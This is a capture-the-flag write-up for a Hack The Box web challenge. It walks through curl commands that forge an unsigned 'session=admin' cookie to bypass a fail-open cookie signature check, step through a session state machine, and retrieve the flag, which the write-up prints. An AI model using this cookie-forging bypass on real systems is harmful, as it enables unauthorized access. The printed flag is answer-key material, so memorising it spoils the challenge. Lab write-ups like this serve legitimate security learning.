# HTB Web Challenge — "Gatery" (Crownspire) — Writeup

**Target:** `154.57.164.75:31715`
**Category:** Web / Auth logic (broken/unsigned cookie trust)
**Stack:** nginx 1.28.3 → Bun + Elysia.js backend, SQLite (bun:sqlite), bcryptjs

## Summary

The app protects a `/api/flag` endpoint behind a two-stage session state
(`admin` → `inside`), gated by a signed session cookie. The real login path
is intentionally uncrackable (random 24-byte admin password generated at
boot, bcrypt-hashed, no register/SQLi route). The actual vuln is that the
Elysia cookie-signing middleware accepts a **raw, unsigned** cookie value
instead of rejecting anything that fails signature verification. This lets
you hand the server `session=admin` directly, skip login entirely, and walk
the state machine to the flag.

## Step-by-step

### 1. Recon the target
```bash
curl -v http://154.57.164.75:31715/
```
Confirms nginx 1.28.3 serving a static React/Vite build (`Gatery`), no
useful info in headers/response body beyond the app shell.

### 2. Pull the JS bundle to find API routes
```bash
curl -s http://154.57.164.75:31715/assets/js/index-BcDa1MFc.js -o app.js
grep -oE '"/api/[a-zA-Z0-9/_-]+"' app.js | sort -u
```
Reveals the API surface: `/api/me`, `/api/login`, `/api/logout`,
`/api/gate/open`, `/api/gate/enter`, `/api/flag`.

### 3. Get the source (from the local challenge archive)
```bash
cat challenge/config/nginx.conf
cat challenge/app/index.ts
```
- `nginx.conf`: plain reverse proxy, `/api/` → `127.0.0.1:3000`, no path
  tricks, no auth logic in nginx itself — ruled out nginx bypass angle.
- `index.ts`: reveals the real logic —
  - `admin` password is `randomBytes(24)`, generated fresh at boot,
    bcrypt-hashed → **not guessable, not crackable**.
  - No registration endpoint, parameterized SQL query → no SQLi.
  - Session state machine:
    - `session.value == 'admin'` → required for `/api/gate/enter`
    - `/api/gate/enter` sets `session.value = 'inside'`
    - `/api/flag` requires `session.value === 'inside'`
  - Cookie is supposed to be signed:
    ```ts
    cookie: { secrets: [sessionSecret], sign: [sessionCookie] }
    ```

### 4. Identify the real bug
The "front door" (real bcrypt login) is a deliberate dead end. The actual
weakness is trusting the cookie-signing library to *reject* invalid
signatures. Some Elysia/cookie-signing setups fail open: if the cookie
doesn't unsign correctly, it can still be read as a raw/plain value rather
than being discarded. That means the server never actually verifies you
went through `/api/login` — it just checks `session.value` afterward.

### 5. Test forging the cookie
```bash
curl -s -b "session=admin" http://154.57.164.75:31715/api/me
```
Result:
```json
{"authenticated":true,"user":{"username":"admin","role":"admin"},"gateOpen":true,"insideGate":false}
```
Confirmed — the raw unsigned `session=admin` cookie is accepted as if it
were legitimately signed by the server.

### 6. Walk the state machine to "inside"
```bash
curl -s -c cookies.txt -b "session=admin" -X POST http://154.57.164.75:31715/api/gate/enter
```
Result:
```json
{"ok":true,"insideGate":true}
```
This response sets a **properly server-signed** `session=inside` cookie,
saved to `cookies.txt`.

### 7. Grab the flag
```bash
curl -s -b cookies.txt -X POST http://154.57.164.75:31715/api/flag
```
Result:
```json
{"ok":true,"flag":"HTB{w3lc0me_b3y0nd_th3_g4t3_56cc455a3598a7dc41fa808e64568c16}"}
```

## Flag
```
HTB{w3lc0me_b3y0nd_th3_g4t3_56cc455a3598a7dc41fa808e64568c16}
```

## Root cause

Trusting client-supplied cookie values without strictly rejecting
signature-verification failures. The app assumed "if `session.value` has
one of the expected strings, it must have come from `/api/login` or
`/api/gate/enter`" — but the signing layer didn't actually enforce that
assumption when handed a malformed/unsigned cookie.

## Takeaway / pattern to remember

Any time a framework sets up signed cookies like:
```ts
cookie: { secrets: [...], sign: [...] }
```
test what happens when you supply a **plain, unsigned value** for that
cookie name. Some signed-cookie implementations fail open (accept it as raw
data) rather than fail closed (reject/ignore it) when the signature check
fails. This bypasses the entire auth chain regardless of how strong the
underlying password/credential system is — the credential system was a red
herring here; the trust boundary was broken one layer below it.
